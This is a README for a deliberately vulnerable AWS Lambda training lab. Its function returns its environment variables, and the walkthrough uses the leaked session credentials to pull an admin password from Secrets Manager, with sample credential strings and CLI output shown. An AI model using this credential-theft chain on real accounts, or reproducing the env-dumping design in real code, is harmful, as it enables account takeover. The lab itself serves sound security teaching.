# Bad Lambda

Lambda function with API gateway and admin password in Secrets Manager
* Returns environment variables of container executing Lambda
* Includes AWS security token details which can be used to assume Lambda role
* The credentials can then be used to retrieve the admin password from Secrets Manager

# WARNING
* Designed for security training purposes
* Do not use on a production account
* Do not use if you are using AWS Secrets Manager in the account
* Could lead to AWS account takeover with excessive Lambda role policy permissions

## DEV environment

to deploy:

* use Terraform v11.7 to deploy:

```
terraform init
terraform workspace new dev
terraform plan
terraform apply
```

## USAGE

Browse to the API Gateway endpoint of the bad-lambda-dev function, provided as a Terraform output, e.g.:
https://r2pjhsdqp2.execute-api.eu-west-1.amazonaws.com/dev/

The environment variables of the Lambda function will be returned:
```
AWS_LAMBDA_FUNCTION_VERSION=$LATEST
AWS_SESSION_TOKEN=FQoGZXIvYXdzEJv//////////wEaDGfc5KqNddb+xhFF7iLnAaCBanmzm8/PykwEKmyW0wVGklVYWvwXIMEIkwYApmscKwMlfDEeMtq1fRlMT6fCgbC8lw36p9dTPn8awx2frzDgNBUUDB/XMth7J8CGz+k8qcRLjwZsihMpqHv2ikozqNP+JptvnPCD//FjBF1aomgkntLbY9qeTigvTTMVDjBjoat3zZyJGKylzOnkCZ/OBIr4wuU4071f/Rud+1szy4eKocJZavdnBhfFfknhakezCrJgVeL8X+JMnnFsEi6zhkn172GOibCbO07SSty7mY6HRb0gzB1w+8wGGroEthoj2NXB/aYYHijQ56veBQ==
AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/bad-lambda-dev
LAMBDA_TASK_ROOT=/var/task
LD_LIBRARY_PATH=/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib
AWS_LAMBDA_LOG_STREAM_NAME=2018/10/20/[$LATEST]214ec27edfb64248ac59a9865c03db62
AWS_EXECUTION_ENV=AWS_Lambda_python3.6
AWS_XRAY_DAEMON_ADDRESS=169.254.79.2:2000
AWS_LAMBDA_FUNCTION_NAME=bad-lambda-dev
PATH=/var/lang/bin:/usr/local/bin:/usr/bin/:/bin
AWS_DEFAULT_REGION=eu-west-1
PWD=/var/task
AWS_SECRET_ACCESS_KEY=xohK8M33/0mDQhW5wWHcNY7QShLsvbjIhhEXrUb+
LAMBDA_RUNTIME_DIR=/var/runtime
LANG=en_US.UTF-8
AWS_REGION=eu-west-1
TZ=:UTC
AWS_ACCESS_KEY_ID=ASIA2L5BHF3A7UTREF4P
SHLVL=1
_AWS_XRAY_DAEMON_ADDRESS=169.254.79.2
_AWS_XRAY_DAEMON_PORT=2000
PYTHONPATH=/var/runtime
_X_AMZN_TRACE_ID=Root=1-5bcb0793-fbe56bdc6615401414db1a74;Parent=234bca345951c93f;Sampled=0
AWS_SECURITY_TOKEN=FQoGZXIvYXdzEJv//////////wEaDGfc5TyNddb+xhFF7iLnAaCBanmzm8/PykwEKmyW0wVGklVYWvwXIMEIkwYApmscKwMlfDEeMtq1fRlMT6fHyuyC8lw36p9dTPn8awx2frzDgNBUUDB/XMth7J8CGz+k8qcRLjwZsihMpqHv2ikozqNP+JptvnPCD//FjBF1aomgkntLbY9qeTigvTTMVDjBjoat3zZyJGKylzOnkCZ/YTWr4wuU4071f/Rud+1szy4eKocJZavdnBhfFfknhakezCrJgVeR9X+JMnnFsEi6zhkn172GOibCbO07SSty7mY6HRb0gzB1w+8wGGroEthoj2NXB/aYYHijQ56veBQ==
AWS_XRAY_CONTEXT_MISSING=LOG_ERROR
_HANDLER=printenv.lambda_handler
AWS_LAMBDA_FUNCTION_MEMORY_SIZE=128
_=/usr/bin/printenv
```

create a new profile in your ~/.aws/credentials file, using those values:
```
[badlambda]
aws_access_key_id = ASIA2L5BHF3A7UTREF4P
aws_secret_access_key = xohK8M33/0mDQhW5wWHcNY7QWFilxLSjIhhEXrUb+
aws_session_token = FQoGZXIvYXdzEJv//////////wEaDGfc5TyNddb+xhFF7iLnAaCBanmzm8/PykwEKmyW0wVGklVYWvwXIMEIkwYApmscKwMlfDEeMtq1fRlMT6fHyuyC8lw36p9dTPn8awx2frzDgNBUUDB/XMth7J8CGz+k8qcRLjwZsihMpqHv2ikozqNP+JptvnPCD//FjBF1aomgkntLbY9qeTigvTTMVDjBjoat3zZyJGKylzOnkCZ/YTWr4wuU4071f/Rud+1szy4eKocJZavdnBhfFfknhakezCrJgVeR9X+JMnnFsEi6zhkn172GOibCbO07SSty7mY6HRb0gzB1w+8wGGroEthoj2NXB/aYYHijQ56veBQ==
```
then use a recent version of the AWS command line interface:
```
$ aws secretsmanager list-secrets --profile badlambda
```
A list of secrets in the eu-west-1 region will be returned:
```
{
    "SecretList": [
        {
            "LastAccessedDate": 1539993600.0, 
            "SecretVersionsToStages": {
                "87AF04AE-B24B-4966-85B1-95C83B7D8717": [
                    "AWSCURRENT"
                ]
            }, 
            "Name": "admin-password-dev", 
            "ARN": "arn:aws:secretsmanager:eu-west-1:YOUR_AWS_ACCOUNT_ID:secret:admin-password-dev-mJstfR", 
            "LastChangedDate": 1540027226.453
        }
    ]
}
```
Copy the secret ARN and paste into the command as below:
```
aws secretsmanager get-secret-value --secret-id "arn:aws:secretsmanager:eu-west-1:YOUR_AWS_ACCOUNT_ID:secret:admin-password-dev-mJstfR" --profile badlambda
```
You will retrieve the secret value of the admin password:
```
{
    "Name": "admin-password-dev", 
    "VersionId": "87AF04AE-B24B-4966-85B1-95C83B7D8717", 
    "SecretString": "cDS41esC&Y7Dudwt4Uvrwo-�w", 
    "VersionStages": [
        "AWSCURRENT"
    ], 
    "CreatedDate": 1540027226.179, 
    "ARN": "arn:aws:secretsmanager:eu-west-1:YOUR_AWS_ACCOUNT_ID:secret:admin-password-dev-mJstfR"
}
```
